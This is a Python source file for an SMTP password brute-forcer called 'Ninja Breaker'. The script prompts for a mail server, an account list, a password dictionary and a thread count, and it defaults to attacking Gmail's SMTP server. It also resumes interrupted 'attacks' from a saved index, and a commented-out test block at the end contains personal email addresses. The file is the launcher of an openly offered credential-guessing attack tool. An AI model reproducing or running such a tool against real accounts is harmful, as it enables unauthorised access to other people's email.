#!/usr/bin/env python
# -*- coding: utf-8 -*-
#
#  ninjabreaker.py
#  
#  Copyright 2013 Moustafa <Moustafa@LAPTOP>
#  
#  This program is free software; you can redistribute it and/or modify
#  it under the terms of the GNU General Public License as published by
#  the Free Software Foundation; either version 2 of the License, or
#  (at your option) any later version.
#  
#  This program is distributed in the hope that it will be useful,
#  but WITHOUT ANY WARRANTY; without even the implied warranty of
#  MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
#  GNU General Public License for more details.
#  
#  You should have received a copy of the GNU General Public License
#  along with this program; if not, write to the Free Software
#  Foundation, Inc., 51 Franklin Street, Fifth Floor, Boston,
#  MA 02110-1301, USA.
#  
#  


from components.smtp_connection import SMTPConnection
from components.brute_forcer import BruteForcer
import os.path
os.chdir(".")

def print_logo():
	print "********************************************************************************"
	print "          _   _ _       _         ____                 _             	"
	print "         | \ | (_)     (_)       |  _ \               | |            	"
	print "         |  \| |_ _ __  _  __ _  | |_) |_ __ ___  __ _| | _____ _ __ 	"
	print "         | . ` | | '_ \| |/ _` | |  _ <| '__/ _ \/ _` | |/ / _ \ '__|	"
	print "         | |\  | | | | | | (_| | | |_) | | |  __/ (_| |   <  __/ |   	"
	print "         |_| \_|_|_| |_| |\__,_| |____/|_|  \___|\__,_|_|\_\___|_|   	"
	print "                      _/ |                                           	"
	print "                     |__/                                          	  \n"  
	print "        The SMTP BruteForcer By Cmpsamurai <moustafa@cmpsamurai.com>     "
	print "                       version 0.1 <Dec 29, 2013>                        "
	print "\n********************************************************************************\n"

def main():
	print_logo()
	auto= raw_input("Do You want to use Default Settings ?\n['smtp.gmail.com:587' , accounts.txt,dict.txt] (y) : ")
	if auto=='y':
		BruteForcer('smtp.gmail.com',587,20,'accounts.txt','dict.txt',0)
	else:
		# Read Server
		Check=False
		while not Check:
			server = raw_input("\nEnter SMTP Server Address: ")
			# Read Port 
			port = int(raw_input("\nEnter SMTP Port number: "))
			# Read ACCOUNT LIST
			_smtp=SMTPConnection(server,port)
			Check=_smtp.Check_Server(server,port)
			if not Check:
				print "Cannot Connect to server , Check Server and Port !!!"
			
			
			
		Check=False
		while not Check:
			accounts_path=raw_input("\nEnter path for accounts list: \ncurr path is: ["+os.getcwd()+"]\n>>>")
			Check=os.path.exists(accounts_path)
			if not Check:
				print "File Cannot Be Found !!!! Please Reneter a valid file"
		
		# Read Dictionary
		Check=False
		while not Check:
			dictionary_path=raw_input("\nEnter path for dictionary:  \ncurr path is: ["+os.getcwd()+"]\n>>>")
			Check=os.path.exists(dictionary_path)
			if not Check:
				print "File Cannot Be Found !!!! Please Reneter a valid file"
		# Read NUM_THREADS
		num_threads=0
		Check=False
		while not Check:
			try:
				num_threads = int(raw_input("Enter number of threads: "))
			except:
				num_threads=0
			if num_threads<=0:
				print "\nPlease Enter A Valid Number of threads"
			else:
				Check=True
		index=0
		try:
			index=int(open("data/index.txt").read().replace('\n',''))
			print "Starting From " ,index , " delete data/index.txt to start from 0"
		except Exception:
			print "New Attack"
		BruteForcer(server,port,num_threads,accounts_path,dictionary_path,index)
	return 0

if __name__ == '__main__':
	main()





'''
	from_addr = "Moustafa<tifa9518@gmail.com>"
	to_addr = "Moustafa.Mahmoud.Fathy@outlook.com"

	subj = "hello"
	date = datetime.datetime.now().strftime( "%d/%m/%Y %H:%M" )

	message_text = "Hello\nThis is a mail from your server\n\nBye\n"

	msg = "From: %s\nTo: %s\nSubject: %s\nDate: %s\n\n%s"%( from_addr, to_addr, subj, date, message_text )

	smtp.sendmail(from_addr, to_addr, msg)
'''
